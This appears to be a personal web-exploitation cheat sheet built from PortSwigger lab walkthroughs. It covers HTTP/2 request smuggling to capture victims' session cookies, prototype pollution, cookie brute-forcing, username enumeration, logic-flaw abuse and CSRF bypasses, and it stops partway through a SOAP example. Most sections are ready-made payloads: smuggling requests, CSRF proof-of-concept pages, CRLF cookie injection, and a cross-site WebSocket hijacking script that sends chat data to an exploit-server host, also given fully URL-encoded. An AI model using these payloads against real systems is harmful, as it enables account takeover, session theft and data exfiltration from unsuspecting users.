|	content-type: application/x-www-form-urlencoded
|	Transfer-Encoding: chunked
|	 \r\n
|	 0\r\n
|	 \r\n
|	 GET /404 HTTP/1.1\r\n
|	 X-Ignore: x

|	|--follow-up returns 404 on smuggled path	----->	H2.TE (CL.TE equivalent)

##### -  END identifying H2.TE - response queue poisoning

##### START EXPLOITATION
**1. Proof of concept**
Send the following request, then issue any normal follow-up request. If the response returns a 404, the smuggling was successful.

> Full request:
```http
POST / HTTP/2
Host: <TARGET>
content-type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /pathThatDoesNotExist40412345 HTTP/1.1\r\n
X-Ignore: x
```
**2 payload to intruder, wait for response**
Repeatedly send the smuggle request to desynchronize the response queue. When a legitimate user authenticates, their response (including the `Set-Cookie` header) ends up queued for the attackers connection.

Send the request below to Burp Intruder with these settings:
- Attack type: **Sniper**
- Payload type: **Null payloads** + continue indefinitely
- Delay: **800ms**
- Threads: **1**
- disable: "Update Content-Length" (in Payload processing rules)
- Run the attack.

> Full request:
```http
POST /pathThatDoesNotExist40412345 HTTP/2
Host: <TARGET>
content-type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /pathThatDoesNotExist40412345 HTTP/1.1
Host: <TARGET>
X-Ignore: x\r\n
\r\n
```
**3 capture user response payload**
After several iterations, one of the Intruder responses will contain a victims session cookie (look for responses that differ in size or contain an unexpected `Set-Cookie` header). Use that cookie to access the admin panel.
...
##### END EXPLOITATION
````
{% endraw %}

### 'Client-side prototype pollution' attack

Use 'Client-side prototype pollution' to achieve DOM-based XSS

{% raw %}
```markdown
##### REQUIREMENTS:
- Burp Suite with the **Autovader** extension installed
- BURP active scanner message : Client-side prototype pollution

##### REFERENCE:
https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries
https://portswigger.net/web-security/prototype-pollution/client-side
https://youtu.be/-tBWrKOzMDs

##### DESCRIPTION:
This walkthrough demonstrates exploiting a client-side prototype pollution vulnerability in a web application. The vulnerability allows an attacker to manipulate the prototype of JavaScript objects, which can lead to various security issues, including DOM-based XSS.

##### START EXPLOITATION

# 1. Use **Autovader** (Burp extension) to scan for prototype pollution.
   > Right-click the request in Burp > Extensions > Autovader > *Prototype Pollution*

# 2. If prototype pollution is found, open Burp's built-in Chromium browser.
# 3. Open the **DOM Invader** extension (pre-installed).
# 4. Under **Attack Types**, enable prototype pollution testing.
# 5. Navigate to the target URL and start the prototype pollution scan.
# 6. After scanning, DOM Invader may offer an auto-exploit option if it finds anything.
# 7. At last, build the payload you want to deliver to the victim:

<script>
window.location = "https://0a5c00ab04f8a3f5831ad3d300c60089.web-security-academy.net/#__proto__[d0992d86]=lnfwrihon&__proto__[hitCallback]=alert(document.cookie)"
</script>

##### END EXPLOITATION
```
{% endraw %}

### 'Server-side prototype pollution' attack

Use 'Server-side prototype pollution' to achieve DOM-based XSS

{% raw %}
````markdown
##### REQUIREMENTS:
- BURP active scanner message: N/A:, check for POST/PUT requests with a JSON body

##### REFERENCE:
https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution
https://portswigger.net/web-security/prototype-pollution/server-side
https://www.youtube.com/watch?v=vS4ud1ENc9w

##### DESCRIPTION
This walkthrough demonstrates Server-side prototype pollution via a JSON request. Injecting a __proto__ key with isAdmin: true pollutes Object.prototype, escalating privileges to admin and allowing deletion of the user carlos.

##### START EXPLOITATION

# 1. Log in with the credentials `wiener:peter`.
   > Use the provided account to authenticate before testing.

# 2. Locate a **POST** or **PUT** request that submits a JSON object (e.g. the update-address form).
# 3. Send the request through Burp and note the normal **happy-flow** request/response:

REQUEST:
```
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "wmYnpptRVyX3fPBo3EB3gwOkBVgmmSFF"
}
```
RESPONSE:
```
{
  "username": "wiener",
  "firstname": "Peter",
  "lastname": "Wiener",
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "isAdmin": false
}
```
# 4. Observe the gadget property `"isAdmin": false` in the response body.
# 5. Inject a `__proto__` key into the request to pollute `Object.prototype` and set `isAdmin` to true:

REQUEST 2:
```
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "wmYnpptRVyX3fPBo3EB3gwOkBVgmmSFF",
  "__proto__": {
    "isAdmin": true
  }
}
```
RESPONSE 2:
```
{
  "username": "wiener",
  "firstname": "Peter",
  "lastname": "Wiener",
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "isAdmin": true
}
```
# 6. Confirm the response now returns `"isAdmin": true` - privileges escalated.

##### END EXPLOITATION
````
{% endraw %}

## 3. Authentication, logic flaws & Session Attacks

### Brute-forcing a 'stay-logged-in' cookie

Use 'Burpsuite' to bruteforce a 'stay-logged-in' cookie value

{% raw %}
```markdown
##### REQUIREMENTS:
- You are able to decode an existing "stay-logged-in" cookie
- you are unable to brute-force the password directly (e.g. via login form or API)

##### REFERENCE:
https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

##### DESCRIPTION:
Log in with 'stay logged in' checked. This adds a `stay-logged-in` cookie - a Base64 string containing the username and an MD5 password hash: base64(username:md5(password)) - and makes the session cookie unnecessary. Brute-force the string by generating MD5 hashes of common passwords, encoding them in the same format, and watching for a successful response or a different Content-Length.

##### START EXPLOITATION

# 1. Log in with a valid account, tick "Stay logged in" checkbox
# 2. base64-decode the stay-logged-in cookie (given on response) -> Base64(username:md5(password))
# 3. (optional) crack the hash to confirm the format
# 4. in order to test this on other users passwords, capture the request
# 4A. send the request to intruder, then
- Attack type: Sniper
- Payload position: stay-logged-in cookie value
- Payload type: Simple list (e.g. fasttrack.txt)
- Payload processing (in order):
    - 1) Hash: MD5           	 -> lowercase hex
    - 2) Add prefix: 'carlos:' 	 -> 'carlos:hashed-password'
    - 3) Encode: Base64
    
# 5. send the request, monitor the responses for a different Content-Length or a successful response
##### END EXPLOITATION
```
{% endraw %}

### Username enumeration attack

Use 'username enumeration' to determine valid usernames

{% raw %}
```markdown
##### REQUIREMENTS:
- possibility to intercept a login request and send it to intruder

##### REFERENCE:
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

##### DESCRIPTION:
multiple techniques on how to detect a username enumeration vulnerability based on different techniques.

##### START EXPLOITATION

> A. RESPONSE TIMING technique
### --- RESPONSE TIMING technique START --- ###

# 1. capture a login request and send it to intruder
- set the username list ("/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt")
- set the password to a 100+ character string

# 2. start intruder. Check if you get a block for too many requests. If so, then:
- set the delay to 1000ms
- use one of the following headers:
    - `X-Forwarded-For`
    - `Host`
    - `X-Forwarded-Host`
    - `X-Host`
    - `X-Forwarded-Server`

### --- RESPONSE TIMING technique END --- ###

> B. SUBTLY DIFFERENT responses technique
### --- SUBTLY DIFFERENT responses technique START --- ###

# 1. capture a login request and send it to intruder
- set the username list ("/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt")
- set the password to a 100+ character string

# 2. go to intruder > settings > "grep - extract"
- Add a grep extract rule on the error message, e.g.: "invalid username or password"
- Click on ok to add

# 3. start intruder. Monitor the "Grep - extract" results in a seperate column

### --- SUBTLY DIFFERENT responses technique START --- ###

> C. DIFFERENT response technique
### --- DIFFERENT response technique START --- ###

# 1. capture a login request and send it to intruder
- set the username list ("/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt")
- set the password to a 100+ character string

# 2. start intruder
- monitor the responses in length/ status-code 

### --- DIFFERENT response technique END --- ###

##### END EXPLOITATION
```
{% endraw %}

### Exploit 'logical flaws' within webapps

Abuse 'logical flaws' to escalate privileges or abuse functionalities

{% raw %}
```markdown
##### REQUIREMENTS:
- There is a logical flaw present in input validation

##### REFERENCE:
- https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input
- https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money

##### DESCRIPTION:
Exploit logical flaws in a web application

##### START EXPLOITATION

### --- EXAMPLE: Exceptional input handling (characters get truncated) --- ###
1. Register a new account using an overly long e-mail address (255+ characters before the @, e.g. `test....@dontwannacry.com`).
2. Verify the account and log in. On the "My Account" page, observe that the displayed e-mail address is truncated to 255 characters.
3. Repeat the registration process, this time using an e-mail address of your choosing.

### --- EXAMPLE: Broken password reset functionality --- ###
1. Request a password reset for your own account.
2. Open the reset link from your inbox, enter and confirm a new password,  intercept the submission request in Burp.
3. In the intercepted request, locate the hidden `username` parameter and change its value to the target users username before forwarding. The application will reset the targets password to the value you supplied.

### --- EXAMPLE: broken password change functionality --- ###
1. Log in to your own account.
2. Change your password and intercept the request. Notice that the username is submitted as a parameter alongside the current password.
3. Change the username parameter to `administrator` and remove the `current-password` parameter entirely.

### --- EXAMPLE: time-sensitive logic flaw --- ###
1. Go to Password Reset, submit a reset for the user `wiener`, capture the request.
2. Send to Repeater and duplicate it - leave request 1 as-is.
3. In Request 2, replace the CSRF token, PHP session cookie, and username with fresh values for `carlos` (send a GET request, retrieve Set-Cookie + CSRF token).
4. Group both tabs within burp (left click - group in repeater) and hit 'Send group (parallel)'.

### --- EXAMPLE: Infinite money --- ###
1. Log in to the account `wiener:peter` and note that your current store credit is $100.
2. Purchase a gift card for $10.
3. At the bottom of the page, register your e-mail address for the newsletter to retrieve a 30% discount code.
4. Apply the discount code to the gift card and observe that the price drops to $7.
5. Purchase the gift card and redeem it. Your store credit is now $103.

# Tip: utilize Burpsuite Macro's to automate this: 
# https://youtu.be/3pqYcbnAHtY?si=QUBEA32OrBX6HLlh (2.44)
1. On the top navbar, click on `>_` (Search).
2. Type "macro", press ENTER, and click "Add" under "Macros".
3. Add the macro by selecting the required requests (use Cmd + click to select multiple).
4. Once the macro is created, add a session handling rule so the macro is invoked when a request matches a given scope (e.g. `test.domain`).
5. Go to Intruder and send null payloads - the macro will trigger on each request, refreshing session state before the payload is sent.

##### END EXPLOITATION
```
{% endraw %}

### CSRF: detection & requirements

Use 'CSRF' to detect if an endpoint is vulnerable and understand the requirements for a successful attack

{% raw %}
````markdown
##### REQUIREMENTS:
- A relevant action.
- Cookie-based session handling.
- No unpredictable request parameters.

##### REFERENCE:
https://portswigger.net/web-security/csrf#what-is-csrf

##### EXAMPLE start
> 1. Example Request
Suppose an application contains a function that lets the user change the email address on their account. When a user performs this action, they make an HTTP request like the following
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```
> 2. Possible CSRF payload (generate with Burp: (right click on request > engagement tools > generate CSRF POC)

```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
- Subject: 
    - INVALID REFERER HEADER 	--> CSRF: Broken referer validation
    - CSRF token and/or key present 	--> CSRF: Token and/or key
##### EXAMPLE end
````
{% endraw %}

### CSRF: Forced OAuth Profile Linking attack

Abuse a missing state parameter on the OAuth linking callback to CSRF the attackers social profile onto a victim account, then login-as-victim via social login.

{% raw %}
```markdown
##### REQUIREMENTS:
- Target app supports OAuth2 profile linking alongside classic login
- The OAuth callback endpoint (e.g. /oauth-linking) lacks a 'state' parameter
- Victim has an active session on the target

##### REFERENCE:
https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

##### DESCRIPTION:
The profile-linking callback accepts a fresh authorization code without CSRF protection. The 'code' is bound to the ATTACKERs identity at the Identity Provider, but the linking action is performed against whichever session hits the callback. By forcing the victims authenticated browser to load the callback URL, the attackers social profile gets linked to the victims account. The attacker can then log in as the victim via "Log in with social media".

##### START EXPLOITATION

1. Detect OAuth2
curl https://§RHOST§/.well-known/openid-configuration
curl https://§RHOST§/.well-known/oauth-authorization-server

Or watch proxy history for: `/auth?client_id=...&redirect_uri=...&response_type=code&scope=...`

2. Map the normal linking flow with your own accounts
- Log in with classic creds (wiener:peter)
- Click "Attach a social profile" and complete OAuth with social creds (peter.wiener:hotdog)
- Log out, then "Log in with social media" to confirm linking works
- In proxy history confirm `/auth?client_id=...` has NO 'state' parameter (that is the vuln)

3. Capture a fresh, unused authorization code
- Burp intercept ON
- Click "Attach a social profile" again
- Forward requests until GET /oauth-linking?code=... is intercepted
- Right-click -> Copy URL
- DROP the request (forwarding consumes the code; dropping keeps it valid)
- Intercept OFF

4. Prepare attacker state
- Log out of the target (otherwise your own browser completes the flow instead of the victims)

5. Host the CSRF payload on the exploit server (Store + Deliver to victim)
<iframe src="https://§RHOST§/oauth-linking?code=STOLEN-CODE"></iframe>

6. Victim executes
Admin's authenticated browser loads the iframe and hits /oauth-linking?code=... No state check => attackers social profile is linked to admin's account

7. Log in as admin
- Back to target -> "Log in with social media"
- You are now admin -> admin panel -> delete carlos

##### END EXPLOITATION
```
{% endraw %}

### CSRF: Broken referer validation

Abuse a weak referer validation to perform a CSRF attack

{% raw %}
````markdown
##### REQUIREMENTS:
- error message: "Invalid referer header"

##### REFERENCE:
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

##### DESCRIPTION:
abuse a CSRF validation with weak referer validation 

> history.pushState()
The history.pushState() method allows you to modify the browser's history and URL without triggering a page reload. By using it to set the URL to include the target domain, you can bypass referer checks that only validate the domain portion of the referer header.

##### START EXPLOITATION
1. find the vulnerable CSRF endpoint, generate a payload with Burp (right click on request > engagement tools > generate CSRF POC)

```
<html>
  <meta name="referrer" content="never">
  <body>
    <script>
        history.pushState('', '', '/?§RHOST§');
    </script>
    <form action="https://§RHOST§/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test1234&#64;test&#46;nl" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
2. submit the payload, observe the "Invalid referer header" error message
3. modify the `history.pushState('', '', '/');` to include the target domain, e.g.:
history.pushState('', '', '/?§RHOST§');

4. resend the payload, observe that it is now working.
5. OPTIONAL: when making use of the exploit-server, add an extra header
`Referrer-Policy: unsafe-url`

##### END EXPLOITATION
````
{% endraw %}

### CSRF: Token and/or key bypass

Bypass CSRF tokens and/or keys restrictions to perform a CSRF attack

{% raw %}
````markdown
##### REQUIREMENTS:
- error message: "Invalid referer header"

##### REFERENCE:
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

##### DESCRIPTION:
abuse a CSRF validation with weak referer validation 

> history.pushState()
The history.pushState() method allows you to modify the browser's history and URL without triggering a page reload. By using it to set the URL to include the target domain, you can bypass referer checks that only validate the domain portion of the referer header.

##### START EXPLOITATION
1. Testing CSRF tokens (with only CSRF TOKEN present)
- remove the CSRF token and see is the application accepts the request
- change the request method from POST to GET
- validate if the CSRF token is tied to the user session
  
2. Testing CSRF tokens and CSRF cookies (with CSRF token and CSRF key present)
- Check if the CSRF token is tied to the CSRF cookie
  + Submit an invalid CSRF token
  + Submit an valid CSRF token from another user
  + Submit a valid CSRF token and cookie from another user

---
account name 	: wiener
csrf token 		: cXLDZ6jsLF9Y22Cn1Add1B8enDIMtV6y
csrf key 		: xtXvo1gOFBghvvPFAH7vxGU4bxkLIcuU

##### CSRF token + key present, but not tied to the user session
1. If user 1 his "CSRF TOKEN" and "CSRF KEY" are accepted for user 2, the next step is to look for header injection - for example, a search function (or any user input) that sets a cookie.
/?search=test;%0d%0aSet-Cookie:%20csrfkey=sup

2. generate A PoC to change, for example, the users email (excute on user 2, csrf token & key from user 1)
```html
<html>
  <body>
    <form action="https://0aba00a004fd33c6805e491c00d30030.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test1234&#64;test&#46;nl" />
      <input type="hidden" name="csrf" value="plvtF4qi6yDTi3rumDYi8EoptP5alz7q" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
    </script>
      <img src="https://0aba00a004fd33c6805e491c00d30030.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CvX3j2Xgyelz1Ez5ixwMFKMzcL7mMjBC%3b%20SameSite=None" onerror="document.forms[0].submit();">
  </body>
</html>
```
##### CSRF token + key present, but not tied to the user session
---
##### CSRF token duplicated in cookie
1. find a spot where you can inject a header, e.g. set a cookie
https://0af600e9048be5f98194987400c60042.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=X7wLs7gu1QGhZ0fV8QXkygfYvTzsXucg%3b%20SameSite=None

2. generate A PoC to change the users email
```
<html>
  <body>
    <form action="https://0af600e9048be5f98194987400c60042.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test1234515&#64;test&#46;nl" />
      <input type="hidden" name="csrf" value="X7wLs7gu1QGhZ0fV8QXkygfYvTzsXucg" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
    </script>
      <img src="https://0af600e9048be5f98194987400c60042.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=X7wLs7gu1QGhZ0fV8QXkygfYvTzsXucg%3b%20SameSite=None" onerror="document.forms[0].submit();">
  </body>
</html>
```
##### CSRF token duplicated in cookie
##### END EXPLOITATION
````
{% endraw %}

### CSRF: SameSite Strict bypass via sibling domain

Bypass SameSite Strict cookie restrictions to perform a CSRF attack via a sibling domain

{% raw %}
````bash
##### REQUIREMENTS:
- The session cookie has "SameSite: Strict" attribute set
- The endpoint, does not implement CSRF token protection
- The vulnerable endpoint is accessible via a sibling domain (e.g. cms.target.com and exploit.target.com)
- The vulnerable endpoint has a vulnerability, such as XSS

##### REFERENCE:
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

##### DESCRIPTION:
SameSite=Strict blocks cookies on cross-SITE requests, not cross-ORIGIN. "Site" = scheme + eTLD+1 (registrable domain per the Public Suffix List), so cms.target.com and chat.target.com are same-site despite being different origins. If you can land XSS on a sibling subdomain, requests fired from that JS context WILL carry Strict cookies for the target sibling, defeating SameSite=Strict as a CSRF/CSWSH defense.

##### START EXPLOITATION

# 1. Verify if your session cookie has "Samesite: Strict" attribute set
session cookie wont be send along with any cross-site requests

# 2. verify the happy flow, in this case:
- send "READY" message through WS
- all earlier message loads, based on the session cookie
  
# 3. notice that the "/chat" endpoint switches from 'https' to 'wss', does not implement CSRF token protection
- a naive cross-site CSWSH from the exploit server only leaks the unauthenticated welcome frame, because the WS handshake goes out without the session cookie under SameSite=Strict
- this is what motivates the sibling-domain pivot in the next steps

# 4. go to /chat.js, copy the following:
```
let newWebSocket = new WebSocket("wss://0ae00051047205c680c1d613009f00eb.web-security-academy.net/chat");

	newWebSocket.onopen = function (evt) {
	newWebSocket.send("READY");
}

newWebSocket.onmessage = function (evt) {
	var message = btoa(evt.data);
	fetch(`https://exploit-0aa800c9042c05a4805ad50601fb005c.exploit-server.net/exploit?t=${message}`);
};
```

# 5. deliver the exploit to the target, then check you access log
# NOTE: due to "SameSite: Strict" cookie attribute, it is not possible to read more then just the first message
```
<script>
let newWebSocket = new WebSocket("wss://0ae00051047205c680c1d613009f00eb.web-security-academy.net/chat");

newWebSocket.onopen = function (evt) {
	newWebSocket.send("READY");
}

newWebSocket.onmessage = function (evt) {
	var message = btoa(evt.data);
	fetch(`https://exploit-0aa800c9042c05a4805ad50601fb005c.exploit-server.net/exploit?t=${message}`)
};
</script>
```

# retrieve the base64-encoded message:
# /exploit?t=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 
# {
#    "user": "CONNECTED",
#    "content": "-- Now chatting with Hal Pline --"
# }

# 6A.
- OPTION 1: search for a stored or reflected XSS, create an XSS payload and deliver that to the target
- OPTION 2: request the 'chat.js' file where the websocket is initiated with burp, then
	- notice the 'Access-Control-Allow-Origin: https://cms-0ae00051047205c680c1d613009f00eb.web-security-academy.net'
	- navigate to that website, find an XSS vulnerability in the login form
	- notice that it is a POST request, change it to a GET request (POST is less usefull in this scenario)
	- /login?username=<script>alert(1)</script>&password=test

# 7. create a new payload that is fully URI encoded (burp encoder)
# WHY: this payload is about to be embedded as a query-string value in step 8
# (?username=<payload>); raw <, >, quotes and & would otherwise break the outer URL
%3c%73%63%72%69%70%74%3e%0a%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%65%30%30%30%35%31%30%34%37%32%30%35%63%36%38%30%63%31%64%36%31%33%30%30%39%66%30%30%65%62%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%09%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%09%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%09%76%61%72%20%6d%65%73%73%61%67%65%5f%65%6e%63%20%3d%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%0a%09%66%65%74%63%68%28%60%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%61%38%30%30%63%39%30%34%32%63%30%35%61%34%38%30%35%61%64%35%30%36%30%31%66%62%30%30%35%63%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%74%3d%24%7b%6d%65%73%73%61%67%65%5f%65%6e%63%7d%60%29%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e

# 8. update the initial payload with "document.location", so the new URL becomes:
```
<script>
document.location = "https://cms-0ae00051047205c680c1d613009f00eb.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%65%30%30%30%35%31%30%34%37%32%30%35%63%36%38%30%63%31%64%36%31%33%30%30%39%66%30%30%65%62%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%09%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%09%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%09%76%61%72%20%6d%65%73%73%61%67%65%5f%65%6e%63%20%3d%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%0a%09%66%65%74%63%68%28%60%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%61%38%30%30%63%39%30%34%32%63%30%35%61%34%38%30%35%61%64%35%30%36%30%31%66%62%30%30%35%63%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%74%3d%24%7b%6d%65%73%73%61%67%65%5f%65%6e%63%7d%60%29%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=test"
</script>
```

# 9. store the payload, then deliver the payload, notice that you can now see the entire chat history in the "access logs"
# WHY this works: the inner script now executes on cms.* (a sibling subdomain),
# so the WS handshake to the target sibling is same-SITE → session cookie
# attaches → server replays full chat history → exfil to exploit server

##### END EXPLOITATION
````
{% endraw %}

### CSRF: SameSite Lax bypass via cookie refresh

Bypass SameSite Lax cookie restrictions to perform a CSRF attack via cookie refresh

{% raw %}
````bash
##### REQUIREMENTS:
- The session cookie does not have the "SameSite" attribute set
- Oauth is utilized
- You are fairly certain that the browser defaults to "SameSite=Lax" after a 2-minute window (e.g. Chrome)
- You have a vulnerable CSRF endpoint at your disposal

##### REFERENCE:
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions

##### DESCRIPTION:
SameSite=Lax blocks cookies on cross-site requests, except for top-level navigation GET requests. However, if the application uses OAuth for authentication, there is a potential attack vector during the OAuth flow. After the user authenticates with the Identity Provider (IdP) and is redirected back to the application, there is a brief window (120 seconds) of time where the session cookie is not yet set with the SameSite attribute. During this window, an attacker can perform a CSRF attack by tricking the user into making a GET request to a vulnerable endpoint, which will include the session cookie and allow the attack to succeed.

##### START EXPLOITATION
# 1. Verify that OAUTH is being utilized, without any additional "SameSite" settings
The default samesite of chrome will be "lax" after a 2-minute window. This window is our attack surface.

# 2. Generate a CSRF PoC of a vulnerable endpoint, for example, the "change email" endpoint (add the <script></script> PoC for a trigger to refresh the cookie)
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
	 <script>
		window.onclick = () => { 
			window.open('https://0a73000103aca710809f5de300ca00e0.web-security-academy.net/'); 
		}
	</script>
    <form action="https://0a73000103aca710809f5de300ca00e0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test@test.nl" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# 3. Copy the PoC, then save it in the "body", deliver the exploit to the victim (run 1)
...

# 4. Copy the PoC again, but now update it to the following (remove <script></script> for cookie refresh, because the cookie is already refreshed in step 3, and we are now in the attack window)
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a73000103aca710809f5de300ca00e0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test@test.nl" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

# 5. copy the updated PoC, save it in the body, then deliver the exploit to the victim (run 2)
...

##### END EXPLOITATION
````
{% endraw %}

## 4. File Inclusion & File Upload

## 5. Deserialization Attacks

## 6. API & Web Service Attacks

## 7. Cryptographic & Transport Failures

## 8. Miscellaneous

### prepare SOAP request

try to build a SOAP request and send it to the server, to check if the server is vulnerable to SOAP-based attacks

{% raw %}
```bash
# SOAP Service Exploitation via WSDL

# 1. Read the WSDL Schema
# Key things to extract:
- Target namespace: -> "http://tempuri.org/"
- Endpoint URL: -> "http://overwatch.htb:8000/MonitorService"
- Operations: -> "StartMonitoring, StopMonitoring, KillProcess"
- Parameters: -> "KillProcess takes 'processName' (xs:string)"

# Example WSDL (trimmed):
<?xml version="1.0" encoding="utf-8"?>
<wsdl:definitions name="MonitoringService" targetNamespace="http://tempuri.org/">
  <wsdl:types>
    <xs:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">

      # No parameters
      <xs:element name="StartMonitoring">
        <xs:complexType><xs:sequence /></xs:complexType>
      </xs:element>

      # No parameters
      <xs:element name="StopMonitoring">
        <xs:complexType><xs:sequence /></xs:complexType>
      </xs:element>

      # Takes 'processName' (string)
      <xs:element name="KillProcess">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="processName" nillable="true" type="xs:string" />
          </xs:sequence>
        </xs:complexType>
      </xs:element>

      # Response elements omitted for brevity
    </xs:schema>
  </wsdl:types>
  # ... bindings ... 
  <wsdl:service name="MonitoringService">
    <wsdl:port name="BasicHttpBinding_IMonitoringService" binding="tns:BasicHttpBinding_IMonitoringService">
      <soap:address location="http://overwatch.htb:8000/MonitorService" />
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>

# 2. Build the SOAP Request
# Template structure:
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:tns="http://tempuri.org/">                           # targetNamespace from WSDL
  <soap:Body>
    <tns:OperationName>                                            # method name from WSDL
      <tns:paramName>value</tns:paramName>    # parameters from xs:sequence
    </tns:OperationName>
  </soap:Body>
</soap:Envelope>

# Concrete example -- KillProcess("notepad.exe"):
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:tns="http://tempuri.org/">
